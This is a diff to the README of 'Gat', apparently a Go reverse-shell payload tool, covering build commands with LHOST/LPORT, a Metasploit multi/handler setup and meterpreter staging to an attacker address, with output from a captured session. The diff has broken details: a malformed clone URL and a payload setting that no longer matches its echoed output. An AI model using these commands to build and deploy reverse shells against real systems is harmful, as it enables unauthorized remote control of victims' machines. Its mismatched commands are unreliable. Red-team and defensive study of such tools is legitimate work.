@@ -28,6 +28,13 @@ your Golang environment (with the `$GOPATH` environment variable).
 
 Then, just run `go get github.com/m1ddl3w4r3/Gat` to fetch the project.
 
+or from source
+``
+git clone https://github.comm1ddl3w4r3/Gat.git
+cd Gat
+go mod init Gat/Gat
+go mod tidy
+``
 ### Building the payload
 
 To simplify things, you can use the provided Makefile.
@@ -97,7 +104,10 @@ $ make linux64 LHOST=192.168.0.12 LPORT=1234
 
 For Mac OS X
 ```bash
-$ make macos LHOST=192.168.0.12 LPORT=1234
+# Predifined 32 bit target
+$ make macos32 LHOST=192.168.0.12 LPORT=1234
+# Predifined 64 bit target
+$ make macos64 LHOST=192.168.0.12 LPORT=1234
 ```
 
 ## Examples
@@ -151,7 +161,7 @@ To use the meterpreter staging feature, just start your handler:
 
 ```bash
 [14:12:45][172.16.122.105][Sessions: 0][Jobs: 0] > use exploit/multi/handler
-[14:12:57][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
+[14:12:57][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
 payload => windows/x64/meterpreter/reverse_https
 [14:13:12][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set lhost 172.16.122.105
 lhost => 172.16.122.105
@@ -191,37 +201,38 @@ Active sessions
 [14:16:48][172.16.122.105][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions -i 1
 [*] Starting interaction with 1...
 
-malleable > getuid
+meterpreter > getuid
 Server username: LWS01\sconner
 ```
 
-### malleable staging
+### meterpreter staging
 
 **WARNING**: this currently only work for the Windows platform.
 
-The malleable staging currently supports the following payloads :
+The meterpreter staging currently supports the following payloads :
 
 To use the correct one, just specify the transport you want to use (tcp, http, https)
 
-To use the malleable staging feature, just start your handler:
+To use the meterpreter staging feature, just start your handler:
 
 ```bash
 
 ```
 
-Then, in `Gat`, use the `malleable` command:
+Then, in `Gat`, use the `meterpreter` command:
 
 ```bash
-[Gat]> malleable https 172.16.122.105:8443
+[Gat]> meterpreter https 172.16.122.105:8443
 ```
 
-A new malleable session should pop in `msfconsole`:
+A new meterpreter session should pop in `msfconsole`:
 
 ```bash
 
-malleable > getuid
+meterpreter > getuid
 Server username: EVILCORP\sconner
 
 
 
 ## Credits
+Ronan Kervella `<r.kervella -at- sysdream -dot- com>`
